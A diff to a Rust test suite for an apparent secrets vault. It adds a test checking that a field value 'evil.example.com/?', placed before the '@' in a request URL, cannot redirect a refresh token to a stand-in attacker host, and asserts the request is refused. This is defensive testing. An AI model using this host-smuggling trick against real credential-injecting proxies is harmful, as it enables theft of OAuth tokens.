@@ -363,6 +363,12 @@ fn the_vault_fills_an_apps_requests_with_secrets_it_never_shows() {
     assert_eq!(echoed["body"], format!("{{{{{id}:refresh_token}}}}"));
     assert_eq!(fetch("gmail", "http://oauth2.googleapis.com/token", "x").0, 400);
 
+    // Nor where a plain field filled in before the path would send it.
+    let moved = json!({ "id": id, "fields": { "client_id": { "value": "evil.example.com/?" } } });
+    assert_eq!(v.ask(&token, "POST", "/items", json!({ "scope": me, "item": moved })).0, 200);
+    let (status, refused) = fetch("gmail", &format!("https://{{{{client_id}}}}@oauth2.googleapis.com/?k={{{{{id}:refresh_token}}}}"), "");
+    assert_eq!(status, 400, "{refused}");
+
     // A sidecar named among an item's hosts gets its field filled into what it sends on.
     let key = json!({ "id": "00000000000000ff", "title": "Work browser", "hosts": ["agent-devices"], "apps": ["agent-devices"], "fields": { "key": { "generate": true } } });
     assert_eq!(v.ask(&token, "POST", "/items", json!({ "scope": me, "item": key })).0, 200);
